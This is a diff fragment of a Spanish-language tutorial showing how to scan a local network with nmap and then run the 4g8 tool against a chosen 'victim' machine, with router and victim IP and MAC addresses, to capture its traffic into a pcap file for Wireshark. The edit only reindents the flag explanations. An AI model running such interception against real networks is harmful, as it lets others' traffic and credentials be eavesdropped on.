@@ -11,11 +11,11 @@ Para conocer los parámetros [ips y MACs] que luego tendremos que entrar en 4g8 
 # nmap 192.168.1.0/24
 Para conocer los equipos de la red. Una vez escogida la victima, lanzar 4g8:
 # 4g8 -i eth0 -g 192.168.1.1 -G 64:69:0C:87:A8:DC -s 192.168.1.12 -S 00:19:01:54:F5:1F -w dump.pcap
--g (la ip del router)
--G (la MAC del router)
--s (la ip de la victima)
--S (la MAC de la victima)
--w (el archivo donde guardar las capturas)
+	-g (la ip del router)
+	-G (la MAC del router)
+	-s (la ip de la victima)
+	-S (la MAC de la victima)
+	-w (el archivo donde guardar las capturas)
 Para el análisis del archivo dump.pcap  puedes usar wireshark entre otros.
 
 
